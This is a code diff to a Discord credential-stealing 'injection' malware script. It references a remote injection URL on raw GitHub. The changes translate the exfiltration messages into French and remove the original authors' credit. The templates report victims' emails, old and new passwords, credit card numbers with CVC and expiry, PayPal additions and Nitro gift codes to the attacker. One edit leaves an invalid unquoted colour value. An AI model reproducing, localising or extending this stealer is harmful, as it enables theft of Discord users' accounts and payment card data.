@@ -19,7 +19,7 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'Chapka Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1192866107757965362/1199051223039488000/full.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
+  embed_color: ff4238, 
   injection_url: 'https://raw.githubusercontent.com/nxbi284/crinjrealject/main/crinjrealject.js', 
   /**
    
@@ -666,13 +666,13 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Informations du compte.**',
+            value: `**Email:** ${email} - **Mot de passe:** ${password}`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Informations Discord**',
+            value: `**Type de nitro:** ${nitro}\n**Badges:** ${badges}\n**Moyens de paiements:** ${billing}`,
             inline: false,
           },
           {
@@ -686,7 +686,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
@@ -708,13 +708,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '**Mot de passe modifié**',
+            value: `**Email:** ${json.email}\n**Ancien mot de passe:** ${oldpassword}\n**Nouveau mot de passe:** ${newpassword}`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Informations Discord**',
+            value: `**Type de nitro:** ${nitro}\n**Badges:** ${badges}\n**Moyens de paiements:** ${billing}`,
             inline: true,
           },
           {
@@ -728,7 +728,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
@@ -750,13 +750,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: '**Adresse EMAIL Modifiée**',
+            value: `**Nouvelle email:** ${email}\n**Mot de passe:** ${password}`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `**Type de nitro:** ${nitro}\nBadges: **${badges}**\n**Moyens de paiements:** ${billing}`,
             inline: true,
           },
           {
@@ -770,7 +770,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
@@ -792,13 +792,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '**PayPal Ajouté**',
+            value: `L'heure de s'acheter des nitros oui ! 😂`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Informations Discord**',
+            value: `**Type de nitro:** ${nitro}\n**Badges:** ${badges}\n**Moyens de paiements:** ${billing}`,
             inline: false,
           },
           {
@@ -812,7 +812,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
@@ -834,13 +834,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**Carte bancaire ajoutée ! 💳**',
+            value: `**Numéro de la carte:** ${number}\n**CVC:** ${cvc}\n**Expiration:** ${expir_month}/${expir_year}`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Informations Discord**',
+            value: `**Type de nitro:** ${nitro}\n**Badges:** ${badges}\n**Moyens de paiements:** ${billing}`,
             inline: true,
           },
           {
@@ -854,7 +854,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
@@ -878,13 +878,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**Nitro Acheté! 🎊**',
+            value: `**Code du nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Informations Discord**',
+            value: `**Type de nitro:** ${nitro}\n**Badges:** ${badges}\n**Moyens de paiements:** ${billing}`,
             inline: true,
           },
           {
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '😘',
         },
       },
     ],
